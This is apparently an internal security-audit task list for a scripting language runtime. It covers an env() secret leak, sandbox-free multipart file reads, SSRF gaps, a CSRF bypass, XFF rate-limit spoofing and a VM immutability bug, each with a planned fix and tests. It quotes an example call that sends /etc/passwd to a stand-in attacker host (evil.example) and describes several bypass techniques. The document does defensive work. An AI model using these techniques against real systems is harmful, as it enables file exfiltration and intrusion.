# Naryads #258–265 — audit tails: security, correctness, hygiene

The series continues the numbering of `docs/naryads-252-257-security-bugfix.md` (the numbers
252–257 are taken). All facts verified on main @ `0d356dd` 2026-09-11:
grep + code reading + runtime probes (the probe output is quoted verbatim). The naryads
are written per the ADR-0122 template (map) and AGENTS.md §8: fact → task → §3 →
"done, when". Deviations from §3 — loudly, §8.4.

Execution order and dependencies:

```
#258 (docs, Block 3 of #252)  — independent, first (pipeline validation)
#260 (multipart read)         — independent
#261 (SSRF package)           — after #260 (same file http.rs)
#264 (VM immutability)        — independent
#262 (CSRF)                   — independent
#263 (rate-limit/bounds)      — after #262 (same file server.rs)
#253-A (exec_gate, #256)      — already queued (issue exists)
#259 (env gate)               — AFTER #253-A: reuses exec_gate(context)
#265 (CI hygiene)             — independent, last
```

---

## Naryad #258 (P2, docs) — Block 3 of naryad #252: a row in the ADR-0122 map + CHANGELOG

**Fact.** Naryad #252 is implemented and merged (PR #261, merge `b8553f2`,
closed issue #255), but the docs block was not finished: PR #261 touched only
`src/builtins/io.rs` and `src/builtins/http.rs`. (1) In the naryad map
`docs/adr/0122-vision-pillar-scope.md` (the section "Naryad map — single
source of truth") there is no #252 row — the last rows: #251, #248, #247,
#250; precedent: rows are added by a docs commit after the merge (see
`1a7c3d5` "map row #250", `a72dbbc` "map row #247"). (2) The CHANGELOG
`[Unreleased]` has no entries on the closing of the P0 TOCTOU or on the behavioral
change of write_file/append_file (loud sandbox errors instead of the silent
empty string) — and these are two material changes for users
of 0.19.

**Task.**
1. A #252 row into the ADR-0122 map: maintenance/security, a brief
   summary (canonical return + two-phase O_NOFOLLOW open,
   http_download also closed), status "merged, PR #261".
2. CHANGELOG `[Unreleased]`:
   - **Fixed** — write-path symlink TOCTOU (sandbox_path_ex returns
     the canonical path; open_sandbox_write: create_new → canonicalization +
     prefix re-check + O_NOFOLLOW; http_download closed by the
     same helper);
   - **Changed** — write_file/append_file/http_download: a sandbox
     violation is now a LOUD error ("file I/O sandbox: ...") instead of
     a silent soft-failure; OS errors remain soft. Mark as
     breaking for code that relied on the silent failure (0.19 allows
     breaking — owner decision per #253-A).
3. Rows for #253 (the naryad document) and #254 (the issue template) —
   optional, one line each, in the same PR.

**§3.** `docs/adr/0122-vision-pillar-scope.md`, `CHANGELOG.md`. Zero
diff in `src/**` and `tests/**`.

**Done, when:** the #252 row is visible in the map; both entries in the CHANGELOG;
`readme_consistency` and the other blocking jobs green on
the merge commit.

---

## Naryad #259 (P1, security) — env(): ungated reads of process variables (depends on #253-A)

**Fact.** `src/builtins/io.rs:156-162` (`builtin_env`) returns any
process environment variable with no gates whatsoever in all contexts,
including serve. Runtime probe on main @ `0d356dd`:

```
$ FAKE_API_SECRET_TOKEN=sk-supersecret mlog run probe_env.mlog
token=sk-supersecret
```

probe_env.mlog is a single line `return "token=" +
env("FAKE_API_SECRET_TOKEN")`. In the serve context the route body is code
receiving untrusted input; a single call of `env("...")` in a template/route
hands out the process secrets: LLM API keys, DB keys, deploy tokens.
Precedents: `exec()` is gated by `METALOGOS_ALLOW_EXEC=1` since naryad #97
(`io.rs:479-483`); `http_*` private networks —
`METALOGOS_HTTP_ALLOW_PRIVATE=1` (#130). `env()` is the last
ungated channel out of the process.

**Task.** A gate in the spirit of the owner-chosen option A of #253:
1. In the serve context `env(key)` by default — a loud error with
   a stable code per the ADR-0131 convention (`ENV_NOT_PERMITTED`) and
   a hint naming the exact flag variable.
2. Escape hatches (override semantics, not AND, as in #253-A):
   `METALOGOS_SERVE_ALLOW_ENV=1` — allow everything in serve; or
   `METALOGOS_ENV_ALLOWLIST="MODEL,TEMP,..."` (a list of names readable in
   serve without a gate).
3. Outside serve (run/repl/check) the behavior does not change — a local script
   reads its own environment; that is the contract.
4. The serve-context detection mechanism — reuse the SSOT from
   #253-A (`exec_gate(context)`), do not spawn a second flag hack: this naryad
   is blocked on #253-A.

**§3.** `src/builtins/io.rs` (builtin_env), the context mechanism from
#253-A (`src/server.rs`/interpreter injection — per the actual code of
#253-A), the README section on env(), CHANGELOG (Changed, breaking for serve).

**Done, when:** the probe `env("FAKE_API_SECRET_TOKEN")` in a serve route
→ 500/an error with the code `ENV_NOT_PERMITTED` when no flags are set; with
`METALOGOS_ENV_ALLOWLIST=FAKE_API_SECRET_TOKEN` → readable; the same code
under `mlog run` → readable as today; the existing env tests stay green;
new tests (serve gate, allowlist, outside-serve behavior) without `#[ignore]`.

---

## Naryad #260 (P1, security) — http_post_multipart: file reads by raw paths — an exfiltration primitive

**Fact.** `src/builtins/http.rs:862-865` (`builtin_http_post_multipart`):
file fields are read with `std::fs::read(path)` by the **raw** path from
a program argument — without `sandbox_path`/`SandboxMode::ForRead`. Any
route/template an untrusted string reaches can send a file
from anywhere on the host FS to a URL from the program:

```
http_post_multipart("https://evil.example", {}, {"f": "../../etc/passwd"})
```

This is the only file read in the builtins outside the sandbox (read_file,
vision_lora_load, http_download — all checked by sandbox/weights-dir).
Contrast: the comment at `http.rs:252` claims an SSRF gate for
multipart — the outgoing URL is gated (`apply_ssrf_resolves`,
`http.rs:846-851`), but the reading of the files being sent is not.

**Task.** Pass every file path through
`sandbox_path_ex(path, SandboxMode::ForRead)`; a sandbox violation —
a loud error with the text "file I/O sandbox: ..." (the template — write_file
after #252; the stable code `SANDBOX_VIOLATION` will come with the execution of
the #254 convention; a loud text suffices here if #254 is not
merged yet). Relative paths inside the sandbox are read as today —
the legitimate case "send a file created by the program" does not break.

**§3.** `src/builtins/http.rs` (only the multipart file fields),
the README section on http_post_multipart, tests.

**Done, when:** test: `http_post_multipart(url, {}, {"f":
"../../../etc/passwd"})` → a loud error; a file inside the sandbox →
is sent (mock server); an absolute path → a loud error; the receiving-side
mock — a local bind to 127.0.0.1, no external network;
`METALOGOS_HTTP_ALLOW_PRIVATE=1` in tests where a resolve is needed; CI
green.

---

## Naryad #261 (P1, security) — SSRF package for outbound HTTP: address ranges, redirect policy, ungated http_download

**Fact.** Three holes of one class (outbound HTTP egress) in
`src/builtins/http.rs` @ `0d356dd`:

1. **Ranges.** `is_blocked_address` (`http.rs:259-277`) blocks
   loopback/link-local/private/metadata/ULA(fc00::/7) but lets through:
   IPv4-mapped IPv6 (`::ffff:10.0.0.5`, `::ffff:169.254.169.254` —
   the V6 branch does not unwrap mapped addresses), unspecified
   (`0.0.0.0`, `::`), CGNAT `100.64.0.0/10`, benchmark `198.18.0.0/15`.
2. **Redirect.** A grep for `redirect` over `http.rs` — **0 occurrences**:
   reqwest by default follows 30x (up to 10 hops), and every hop
   re-resolves DNS WITHOUT a repeated SSRF pin — the pin is bypassed with
   a single redirect to an attacker host (plus the Authorization header is leaked
   cross-host by default).
3. **http_download.** Builds its own client
   (`http.rs:719-725`) and sends the request directly (`:732`) —
   `apply_ssrf_resolves` is NOT called (contrast:
   http_get/http_post/http_post_multipart are gated; the comment
   `http.rs:252` promises the gate only for the three). The IO side of download
   is closed by #252; the egress side is not.

**Task.**
1. `is_blocked_address`: unwrapping of IPv4-mapped IPv6 (`to_ipv4_mapped()`)
   with a re-check by the V4 branch; block `is_unspecified`; CGNAT
   100.64/10 and 198.18/15 — as explicit ranges (std provides no helpers).
2. Redirect policy: `Policy::none()` for all four egress builtins
   (get/post/multipart/download) — a 3xx response is returned as is;
   the decision belongs to the program (security-by-design: misuse is
   loud). Breaking — document in README/CHANGELOG (0.19
   allows it). The alternative "follow with a re-pin on every hop" is out of
   scope; a revisit point in the CHANGELOG.
3. http_download: pass the URL through `apply_ssrf_resolves` like the
   other three.

**§3.** `src/builtins/http.rs`, README sections http_*, CHANGELOG
(Changed: redirect), tests `naryad_130_ssrf_guard.rs` /
`naryad_150_ipv6_ula_ssrf.rs` (extend, do not break).

**Done, when:** unit tests for every new blocked range (mapped,
0.0.0.0, ::, 100.64.1.1, 198.18.0.1); test: a 302 redirect → the status and
Location are returned, the body is NOT downloaded (mock server); test:
http_download to 127.0.0.1 without the flag → a loud refusal (currently —
a successful download); the existing SSRF tests stay green.

---

## Naryad #262 (P1, security) — CSRF: the stateless fallback accepts tokens never issued; the session binding is dead

**Fact.** `src/server.rs` @ `0d356dd`, `check_csrf` (start `:806`):

1. When cookie `_mlog_csrf` and header `X-CSRF-Token` match, a token
   **the server never issued** is accepted: the comment
   `:835-838` "If absent (e.g. server restarted, or stateless
   double-submit client), accept" — `.unwrap_or(false)` at `:841`.
   A classic bypass of naive double-submit: an attacker able to
   plant a cookie (subdomain injection) picks any
   cookie+header pair — the server only checks their equality.
2. The token-to-session binding is dead: at issuance `(session_id_for_csrf, Instant)` is written (`:786-788`), but `check_csrf`
   receives no session_id and never compares against it — it is kept only
   for the TTL.

**Task.**
1. Remove the stateless fallback: the token must be present in the server's
   `csrf_tokens` (issued by this process and not expired by TTL);
   "the server restarted" — an honest 403 with a token re-request (the page
   reloads, the token is reissued — the UX degradation is bounded).
2. Pass the session identifier into `check_csrf` and compare it with the one recorded
   at issuance: a mismatch — 403 + a record in audit_log ("CSRF: session
   binding mismatch"). The dead half of the tuple starts working.
3. Do not touch the issuance mechanics (#125: NO HttpOnly — the
   double-submit contract is that it is readable by JS); do not change the 15-minute TTL.

**§3.** `src/server.rs` (check_csrf, the issuance point, the call from the router),
tests `naryad_125_csrf_no_httponly.rs` (extend), the README section on
middleware.

**Done, when:** test: a homemade cookie+header pair (not from the store)
→ 403 (currently — 200); test: a valid token with a foreign session → 403;
test: an issued token of its own session → passes; the TTL tests stay green;
server tests without external network.

---

## Naryad #263 (P1, security) — rate-limit keyed on a spoofable XFF; state maps without bounds

**Fact.** `src/server.rs` @ `0d356dd`:

1. `extract_client_ip` (`:894-896`) takes `x-forwarded-for` (then
   `x-real-ip`) and **never** the real peer address: ConnectInfo is not
   passed into the server (grep — 0 occurrences). Any client sends
   `X-Forwarded-For: <random>` with every request → the key of
   `check_rate_limit` (`:721`, the limit is hard-coded 100) is always fresh —
   the rate limit constrains nothing except honest clients.
2. The state maps (`:143-171`): `sessions`, `csrf_tokens`,
   `rate_limits` — `DashMap` without a size bound. Sweeping exists
   only for csrf_tokens (`:438-450`, an expired sweep); `rate_limits`
   is swept only of one key's entries, `sessions` is not swept at all
   (outsider keys live forever). Scenario: a cheap HTTP flood of
   unique keys → unbounded growth of the process's memory.

**Task.**
1. Real IP: `into_make_service_with_connect_info::<SocketAddr>()`
   + the peer address as the default key; XFF/X-Real-IP — ONLY if
   `METALOGOS_TRUSTED_PROXIES` is set (CIDR/list; from XFF take the
   last trusted hop — document the chosen semantics
   loudly).
2. Map bounds: a cap on the entry count (a constant + a metric in the
   log); on exceeding it — refuse a new session/key with 429/503 instead of
   silent growth; a sweep of stale entries for `rate_limits`
   (the csrf sweep as the template) and for `sessions` (a TTL from the server config,
   by default — the current session contract).
3. The limit 100 — move into the server declaration (a field with a default);
   do not change the default.

**§3.** `src/server.rs`, README sections rate_limit/sessions, tests
`test_74_*` (extend), CHANGELOG (Changed: the rate-limit key).

**Done, when:** test: the 101st request from one peer address → 429;
test: XFF spoofing without trusted-proxies does not change the key (a client with
XFF and one without — a single bucket); test: with METALOGOS_TRUSTED_PROXIES the key
is taken from XFF; test: the map cap — the refusal is loud, memory is bounded;
connect-info passed through, the server tests stay green.

---

## Naryad #264 (P2, bug) — immutability: mlog check passes, the VM silently assigns (probe)

**Fact.** The contract (naryad #14, REFERENCE.md:108-116, the
`examples/p30_assign_*` examples): without `let mut`, assignment is the error
"cannot assign to immutable variable". Runtime probe on main @
`0d356dd` (pattern+flow, body: `let x = 10` / `x = 20` / `return
to_string(x)`):

```
$ mlog check probe.mlog     → OK: no issues found.            (exit 0)
$ mlog run probe.mlog       → error: cannot assign to immutable variable: x
                              (use 'let mut x' to make it mutable)  (exit 1, TW)
$ mlog compile && mlog run probe.mbc → prints 20             (exit 0, VM)
```

Three backends — three answers: static analysis lets it pass, TW refuses
(the contract), the VM silently violates the contract and assigns. A program
rejected by `mlog run` runs successfully after `mlog compile` — backend
parity (the #160/n250 line) is broken in type safety, silently.

**Task.**
1. `semantic.rs`: a static error for assignment to a non-mut variable
   (the text per the TW template: "cannot assign to immutable variable: x (use
   'let mut x' to make it mutable)") — now `mlog check` catches it before
   the run. Check: does it break the existing examples corpus
   (p30_assign_immutable expects an error — verify the channel: its .error
   checks the TW path).
2. VM: the `StoreAssign` branch — an assignment to a global/local without the mut flag
   (the flag is known to the compiler at compile time — carried into
   instruction metadata or a separate mut-slot table in the Program;
   do not break the .mbc schema — a compiler check at generation: if
   semantics already rejected it, it never reaches the VM; the VM check is a
   backstop with a loud error) — never silent.
3. Parity test: the same source → identical outcomes of TW and VM
   (both fail loudly, or check rejects before both).

**§3.** `src/semantic.rs`, `src/compiler.rs`/`src/vm.rs` (the minimum for the
backstop), tests (a new `naryad_264_*`), examples — only if the
corpus contains non-mut assignments (then list them loudly in the PR body).

**Done, when:** the probe fact is reversed: `mlog check` → an error;
if semantics is bypassed (compiled past-check) — the VM fails loudly,
does not print 20; the `#[ignore]` counter does not grow; vm_golden/crosscheck
green.

---

## Naryad #265 (P3, hygiene) — CI is ubuntu-only; coverage is not measured

**Fact.** `.github/workflows/ci.yml` @ `0d356dd`: all jobs are
`runs-on: ubuntu-latest` (10 occurrences; grep). The project is positioned
as portable Rust, but: (1) there is not a single job on another OS —
`#[cfg(unix)]` code (O_NOFOLLOW from #252, the unix-symlink tests) is never checked
on Windows even for compilability in the CI matrix; (2) code coverage is not measured
anywhere or in any way — the "620 lib tests" are known, but what share of `src/**` they do not touch is unknown (the audit finding
"no coverage").

**Task.**
1. Matrix: add one advisory job `cargo check --all-features
   --all-targets` on `windows-latest` + one on `macos-latest`
   (advisory: non-blocking; their status is recorded in the job report;
   do not make them blocking — the ubuntu jobs remain the only
   blocking set; linux-only dependencies, if found — list them
   loudly in the PR body).
2. Coverage: an advisory job `cargo llvm-cov --summary` (or
   tarpaulin) uploading a summary artifact; do NOT introduce
   threshold gates (the first measurement is the baseline; gates are a separate owner
   decision based on its numbers).
3. The final numbers (coverage %, matrix status) — add as a line in the PR.

**§3.** `.github/workflows/ci.yml`. Zero diff in `src/**` and
`tests/**`.

**Done, when:** the three new advisory jobs in CI are green (or their
redness is a reproducible documented fact with the root cause in the PR body);
a coverage artifact with a baseline number; the blocking set unchanged
(14 blocking jobs in place).
